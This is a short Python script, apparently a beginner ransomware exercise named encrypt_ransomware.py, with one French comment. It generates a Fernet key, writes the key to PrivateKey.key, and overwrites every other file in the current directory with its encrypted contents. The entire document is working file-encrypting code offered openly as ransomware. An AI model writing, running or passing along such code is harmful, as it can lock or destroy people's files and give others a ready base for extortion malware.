import os
from cryptography.fernet import Fernet


files=[]

for file in os.listdir():
    if file == "decrypt_ransomware.py" or file =="encrypt_ransomware.py" or file=="PrivateKey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key= Fernet.generate_key() ##Prq la clé est généré à chaque fois??
with open("PrivateKey.key", "wb") as thekey: 
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents= thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
